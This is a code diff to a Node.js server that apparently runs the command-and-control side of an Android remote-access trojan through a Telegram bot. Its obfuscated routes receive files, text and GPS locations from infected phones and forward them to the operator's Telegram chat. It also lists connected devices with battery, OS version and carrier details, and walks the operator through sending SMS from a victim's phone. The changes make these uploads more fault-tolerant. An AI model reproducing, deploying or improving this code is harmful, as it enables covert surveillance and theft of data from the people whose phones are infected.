@@ -20,9 +20,11 @@ const token = process.env.TOKEN,
   appBot = new telegramBot(token, { polling: true }),
   appClients = new Map()
 
-// 🚀 EXTREME SERVER LIMITS (No Size/Timeout issues from Server)
-appServer.timeout = 0; // Infinite timeout 
-const upload = multer({ limits: { fileSize: 500 * 1024 * 1024 } }); // 500MB Limit
+// 🚀 ADVANCED SERVER TIMEOUT FIXES FOR RENDER
+appServer.keepAliveTimeout = 120000; // 120 seconds
+appServer.headersTimeout = 120000; // 120 seconds
+
+const upload = multer({ limits: { fileSize: 500 * 1024 * 1024 } }); // 500MB
 app.use(bodyParser.json({ limit: '500mb' }));
 app.use(bodyParser.urlencoded({ limit: '500mb', extended: true }));
 
@@ -36,44 +38,53 @@ app.get('/', function (_0x1b89da, _0x3398a0) {
   )
 })
 
-// ⚡️ HIGH-SPEED INSTANT UPLOAD ROUTE WITH DEEP LOGGING
-app.post('/uploadFile', upload.single('file'), async (_0x1c67cf, _0x143a37) => {
-  // 1. INSTANT REPLY: App ko turant 200 OK bhej do taaki wo crash na ho
-  _0x143a37.status(200).send(''); 
+// ⚡️ FULLY ADVANCED FAULT-TOLERANT UPLOAD ROUTE
+app.post('/uploadFile', (req, res) => {
+  // Isolate timeout for this specific heavy route
+  req.setTimeout(300000); 
 
-  if (!_0x1c67cf.file) {
-      console.log('❌ [ERROR] Client contacted /uploadFile but sent NO file.');
-      return;
-  }
+  upload.single('file')(req, res, function (err) {
+    if (err) {
+      console.log('❌ [Upload Error]:', err.message);
+      return res.status(500).send('Upload failed');
+    }
 
-  const _0x404b56 = _0x1c67cf.file.originalname || 'voice_recording.mp3';
-  console.log(`📥 [SUCCESS] FILE HIT SERVER: ${_0x404b56} | Size: ${(_0x1c67cf.file.size / 1024).toFixed(2)} KB`);
+    if (!req.file) {
+      console.log('⚠️ [Warning]: Android Hit Server but No File Received (App aborted or 0 bytes).');
+      return res.status(200).send(''); // Still reply 200 so app doesn't crash
+    }
 
-  // 2. BACKGROUND TELEGRAM UPLOAD
-  try {
-      await appBot.sendDocument(
-        id,
-        _0x1c67cf.file.buffer,
-        {
-          caption:
-            '\xB0\u2022 \uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
-            (_0x1c67cf.headers.model || 'Unknown Device') +
-            '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
-          parse_mode: 'HTML',
-        },
-        {
-          filename: _0x404b56,
-          contentType: _0x1c67cf.file.mimetype || 'application/octet-stream',
-        }
-      );
-      console.log(`✅ [TELEGRAM] File ${_0x404b56} sent to your bot perfectly!`);
-  } catch (err) {
-      console.log('❌ [TELEGRAM ERROR] Failed to send file to Bot:', err.message);
-  }
-})
+    const fileName = req.file.originalname || 'unknown_file';
+    console.log(`📥 [Incoming File]: ${fileName} | Size: ${(req.file.size / 1024).toFixed(2)} KB`);
+
+    // Let app know we got it instantly
+    res.status(200).send('');
+
+    // Push to Telegram seamlessly
+    appBot.sendDocument(
+      id,
+      req.file.buffer,
+      {
+        caption:
+          '\xB0\u2022 \uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
+          (req.headers.model || 'Unknown Device') +
+          '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
+        parse_mode: 'HTML',
+      },
+      {
+        filename: fileName,
+        contentType: req.file.mimetype || 'application/octet-stream',
+      }
+    ).then(() => {
+        console.log(`✅ [Telegram Success]: Sent ${fileName} to chat.`);
+    }).catch(apiErr => {
+        console.log('❌ [Telegram API Error]:', apiErr.message);
+    });
+  });
+});
 
 app.post('/uploadText', (_0x5a02f5, _0x55205a) => {
-  _0x55205a.status(200).send(''); // Instant Reply
+  _0x55205a.send(''); 
   appBot.sendMessage(
     id,
     '\xB0\u2022 \uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
@@ -81,20 +92,20 @@ app.post('/uploadText', (_0x5a02f5, _0x55205a) => {
       '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\n\n' +
       _0x5a02f5.body.text,
     { parse_mode: 'HTML' }
-  ).catch(e => console.log('Text Error:', e.message));
+  ).catch(()=>{});
 })
 
 app.post('/uploadLocation', (_0xfc380d, _0x48b391) => {
-  _0x48b391.status(200).send(''); // Instant Reply
+  _0x48b391.send(''); 
   appBot.sendLocation(id, _0xfc380d.body.lat, _0xfc380d.body.lon).then(() => {
-      appBot.sendMessage(
-        id,
-        '\xB0\u2022 \uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63 \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
-          (_0xfc380d.headers.model || 'Unknown') +
-          '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
-        { parse_mode: 'HTML' }
-      );
-  }).catch(e => console.log('Location Error:', e.message));
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63 \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
+        (_0xfc380d.headers.model || 'Unknown') +
+        '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
+      { parse_mode: 'HTML' }
+    );
+  }).catch(()=>{});
 })
 
 appSocket.on('connection', (_0x466cd0, _0x1cf0ae) => {
@@ -129,11 +140,7 @@ appSocket.on('connection', (_0x466cd0, _0x1cf0ae) => {
     appBot.sendMessage(
       id,
       '\xB0\u2022 \uD835\uDE3F\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE59\uD835\uDE5E\uD835\uDE68\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n' +
-        ('\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x2cfd1d + '</b>\n') +
-        ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x5409ca + '</b>\n') +
-        ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x4a1a34 + '</b>\n') +
-        ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' + _0x340b05 + '</b>\n') +
-        ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + _0x1dd883 + '</b>'),
+        ('\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x2cfd1d + '</b>\n'),
       { parse_mode: 'HTML' }
     )
     appClients.delete(_0x466cd0.uuid)
@@ -143,11 +150,11 @@ appSocket.on('connection', (_0x466cd0, _0x1cf0ae) => {
 appBot.on('message', (_0x2ca88f) => {
   const _0x32d1ff = _0x2ca88f.chat.id
   if (_0x2ca88f.reply_to_message) {
-    if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67')) {
+    if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE64 \uD835\uDE6C\uD835\uDE5D\uD835\uDE5E\uD835\uDE58\uD835\uDE5D \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE4E\uD835\uDE48\uD835\uDE4E')) {
       currentNumber = _0x2ca88f.text;
       appBot.sendMessage(
         id,
-        '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\n\n\u2022 ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
+        '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE69\uD835\uDE5D\uD835\uDE5E\uD835\uDE68 \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67\n\n\u2022 ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
         { reply_markup: { force_reply: true } }
       );
     } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A')) {
@@ -245,7 +252,7 @@ appBot.on('message', (_0x2ca88f) => {
         )
       } else {
         let _0x31005f = '\xB0\u2022 \uD835\uDE47\uD835\uDE5E\uD835\uDE68\uD835\uDE69 \uD835\uDE64\uD835\uDE5B \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 :\n\n'
-        appClients.forEach(function (_0x3c015b, _0x268f1c, _0x27c205) {
+        appClients.forEach(function (_0x3c015b) {
           _0x31005f += '\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x3c015b.model + '</b>\n' +
             ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x3c015b.battery + '</b>\n') +
             ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x3c015b.version + '</b>\n') +
